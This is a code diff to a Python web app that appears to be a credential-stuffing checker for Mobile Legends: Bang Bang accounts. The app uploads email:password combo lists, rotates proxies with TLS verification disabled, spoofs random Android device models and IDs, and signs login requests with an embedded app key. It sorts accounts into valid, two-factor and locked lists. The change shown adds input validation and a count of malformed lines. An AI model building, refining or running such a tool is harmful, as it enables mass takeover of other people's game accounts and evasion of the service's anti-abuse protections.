@@ -18,10 +18,11 @@ results = {
     "valid_accounts": [],
     "2fa_accounts": [],
     "locked_accounts": [],
+    "bad_lines": 0,  # NEW: count of skipped bad lines
 }
 
 # MLBB App Key (important for sign)
-APP_KEY = "N0lFaXliVkhwTWdCck5WamFBYVFaazg5V3FGN1V2V1k="  # MLBB Android App Key (fixed one)
+APP_KEY = "N0lFaXliVkhwTWdCck5WamFBYVFaazg5V3FGN1V2V1k="
 
 # Load proxies
 with open("proxies.txt", "r") as f:
@@ -37,7 +38,6 @@ async def get_async_client():
     transport = httpx.AsyncHTTPTransport(proxy=proxy_url, verify=False)
     return httpx.AsyncClient(transport=transport, timeout=httpx.Timeout(10.0))
 
-# Device info generator
 def generate_device_info():
     devices = [
         ("Xiaomi Redmi Note 10", "11"),
@@ -50,10 +50,9 @@ def generate_device_info():
         ("OnePlus Nord", "13"),
     ]
     device, android_version = random.choice(devices)
-    device_id = str(random.randint(100000000000000, 999999999999999))  # 15 digits
+    device_id = str(random.randint(100000000000000, 999999999999999))
     return device, android_version, device_id
 
-# SIGN generator
 def generate_sign(password):
     random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
     timestamp = str(int(time.time()))
@@ -165,10 +164,20 @@ async def home(request: Request):
 async def upload(file: UploadFile):
     content = await file.read()
     accounts = []
+    bad_lines = 0
+
     for line in content.decode().splitlines():
         if ":" in line:
-            email, password = line.strip().split(":", 1)
-            accounts.append((email, password))
+            parts = line.strip().split(":", 1)
+            if len(parts) == 2 and parts[0].strip() and parts[1].strip():
+                email, password = parts
+                accounts.append((email.strip(), password.strip()))
+            else:
+                bad_lines += 1
+        else:
+            bad_lines += 1
+
+    results["bad_lines"] = bad_lines
 
     semaphore = asyncio.Semaphore(20)
 
